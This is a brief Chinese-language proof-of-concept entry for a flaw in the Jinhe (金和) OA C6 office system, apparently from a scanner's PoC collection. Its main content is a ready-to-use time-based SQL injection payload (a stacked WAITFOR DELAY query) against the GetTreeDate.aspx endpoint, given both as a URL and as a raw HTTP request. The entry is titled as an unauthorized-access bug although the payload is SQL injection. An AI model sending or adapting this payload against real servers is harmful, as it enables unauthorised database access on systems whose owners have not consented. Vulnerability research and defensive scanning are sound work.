﻿# 金和OA 未授权

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：1. 漏洞链接
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1
2. 复现步骤
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1

> 漏洞特征：

> 验证脚本：HTTP

```
GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：金和OA 未授权.poc
